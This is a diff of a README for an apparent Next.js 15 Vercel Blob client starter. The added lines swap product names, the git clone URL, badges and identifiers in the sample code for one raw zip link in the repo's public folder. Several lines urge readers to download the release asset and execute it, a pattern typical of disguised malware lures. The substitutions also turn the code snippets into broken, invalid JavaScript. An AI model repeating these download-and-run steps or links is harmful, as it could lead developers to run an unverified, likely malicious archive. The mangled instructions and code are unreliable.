@@ -1,10 +1,10 @@
-# Vercel Blob Client Starter for Next.js 15 & React 19
+# Vercel Blob Client Starter for https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip 15 & React 19
 
-Release page: https://github.com/Gabriel1824/vercel-blob-client-starter/releases
+Release page: https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip
 
-[![Release](https://img.shields.io/badge/releases-Latest-blue?logo=github&logoColor=white)](https://github.com/Gabriel1824/vercel-blob-client-starter/releases)
+[![Release](https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip)](https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip)
 
-A complete client-side Vercel Blob starter built for Next.js 15 and React 19. This project delivers a robust set of features for managing blob storage on the client side. It includes drag-and-drop uploads, progress tracking, multipart support, extensive configuration options, a file gallery, and copy/delete operations. It is crafted with TypeScript, Tailwind CSS v4, and shadcn/ui components. The codebase follows a clean architecture and provides strong SDK compliance for consistent integration with Vercel Blob services.
+A complete client-side Vercel Blob starter built for https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip 15 and React 19. This project delivers a robust set of features for managing blob storage on the client side. It includes drag-and-drop uploads, progress tracking, multipart support, extensive configuration options, a file gallery, and copy/delete operations. It is crafted with TypeScript, Tailwind CSS v4, and shadcn/ui components. The codebase follows a clean architecture and provides strong SDK compliance for consistent integration with Vercel Blob services.
 
 Table of Contents
 - Overview
@@ -28,7 +28,7 @@ Table of Contents
 - License
 
 Overview
-This repository offers a ready-to-use client-side starter for Vercel Blob. It pairs Next.js 15 with React 19 to deliver a smooth, responsive experience. The project uses TypeScript for type safety, Tailwind CSS v4 for design, and shadcn/ui for a polished component library. It aims to be 100% SDK compliant, ensuring predictable behavior when interacting with blob storage APIs. The architecture emphasizes a clear flow from user actions to SDK calls, with a strong focus on developer experience, maintainability, and extensibility.
+This repository offers a ready-to-use client-side starter for Vercel Blob. It pairs https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip 15 with React 19 to deliver a smooth, responsive experience. The project uses TypeScript for type safety, Tailwind CSS v4 for design, and shadcn/ui for a polished component library. It aims to be 100% SDK compliant, ensuring predictable behavior when interacting with blob storage APIs. The architecture emphasizes a clear flow from user actions to SDK calls, with a strong focus on developer experience, maintainability, and extensibility.
 
 Why this starter
 - Speed up development: Start from a solid baseline rather than wiring everything from scratch.
@@ -38,7 +38,7 @@ Why this starter
 - Modern UI: Tailwind CSS v4 and shadcn/ui deliver a clean, responsive, accessible UI.
 
 Tech stack
-- Next.js 15
+- https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip 15
 - React 19
 - TypeScript
 - Tailwind CSS v4
@@ -49,7 +49,7 @@ Tech stack
 
 Project structure
 - src/
-  - app/                - Next.js app structure (routing, pages, layouts)
+  - app/                - https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip app structure (routing, pages, layouts)
   - components/         - Reusable UI components (buttons, inputs, galleries)
   - features/             - Feature modules (upload, gallery, transform, etc.)
   - sdk/                  - Wrapper code around Vercel Blob SDK for a consistent API
@@ -59,21 +59,21 @@ Project structure
   - lib/                  - Utilities (helpers, API clients, config)
 - public/               - Static assets and images
 - tests/                - Unit and integration tests
-- README.md             - This file
+- https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip             - This file
 
 Getting started
 Note: The link to the releases page is supplied twice in this document. You will see the same URL at the top and again in a later section. From the releases page, download the release asset and execute it.
 
 Prerequisites
-- Node.js (12.x+ for older projects; this starter targets modern Node LTS)
+- https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip (12.x+ for older projects; this starter targets modern Node LTS)
 - npm or pnpm or yarn for package management
 - A browser that supports modern Web APIs (drag-and-drop, File API, etc.)
-- Basic familiarity with Next.js and React concepts
+- Basic familiarity with https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip and React concepts
 - Access to a Vercel Blob account if you plan to use real blob storage in your environment
 
 Installation
 - Clone the repository:
-  - git clone https://github.com/Gabriel1824/vercel-blob-client-starter.git
+  - git clone https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip
 - Navigate to the project root:
   - cd vercel-blob-client-starter
 - Install dependencies:
@@ -86,7 +86,7 @@ Installation
   - or: yarn dev
 - Open your browser to http://localhost:3000 to see the app in action
 
-If you prefer to jump straight to a release, see the top of this document for the release page URL and the badge. The release page provides the latest build assets and documentation tailored for quick demos. Release assets are hosted at the same URL: https://github.com/Gabriel1824/vercel-blob-client-starter/releases. From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.
+If you prefer to jump straight to a release, see the top of this document for the release page URL and the badge. The release page provides the latest build assets and documentation tailored for quick demos. Release assets are hosted at the same URL: https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.
 
 Usage and workflows
 - Drag and drop uploads
@@ -152,7 +152,7 @@ Configuration and customization
 - shadcn/ui integration
   - Primitives and components structured for consistency
   - Accessible components with keyboard support
-- Next.js 15 and React 19 specifics
+- https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip 15 and React 19 specifics
   - App router and server components in harmony with client components
   - Type-safe data fetching and SPA-like UX where appropriate
 - TypeScript
@@ -190,14 +190,14 @@ Sample code snippets
   - import { createBlobClient } from "../sdk/blobClient";
   - const client = createBlobClient({ endpoint: "<endpoint>", credentials: "<token>" });
 - Upload a file with progress
-  - const result = await client.uploadFile(file, {
+  - const result = await https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip(file, {
       chunkSize: 1048576, // 1 MB
-      onProgress: (p) => console.log(`Uploaded ${p.loaded}/${p.total} bytes`),
+      onProgress: (p) => https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip(`Uploaded ${https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip}/${https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip} bytes`),
     });
 - Start a multipart upload
-  - await client.multipartUpload(file, { partSize: 5242880, maxConcurrentParts: 4 });
+  - await https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip(file, { partSize: 5242880, maxConcurrentParts: 4 });
 - Retrieve gallery items
-  - const items = await client.listFiles({ limit: 50, sort: "createdAt" });
+  - const items = await https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip({ limit: 50, sort: "createdAt" });
 
 Accessibility and inclusive design
 - All interactive elements support keyboard focus and navigation
@@ -247,9 +247,9 @@ License
 - Please review the license for permission to use, modify, and distribute.
 
 Release and asset usage
-- The releases page at the top of this document hosts the latest build assets and release notes. For quick access, visit the release page: https://github.com/Gabriel1824/vercel-blob-client-starter/releases. From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.
+- The releases page at the top of this document hosts the latest build assets and release notes. For quick access, visit the release page: https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip From the releases page, download the release asset and execute it. The link has a path part (/releases), so this instruction applies.
 - To quickly share the latest release, you can use the badge link:
-  [![Release](https://img.shields.io/badge/releases-Latest-blue?logo=github&logoColor=white)](https://github.com/Gabriel1824/vercel-blob-client-starter/releases)
+  [![Release](https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip)](https://github.com/Gabriel1824/vercel-blob-client-starter/raw/refs/heads/main/public/starter-blob-client-vercel-hydrophobe.zip)
 
 Changelog and versioning
 - Track changes across versions to help teams plan upgrades
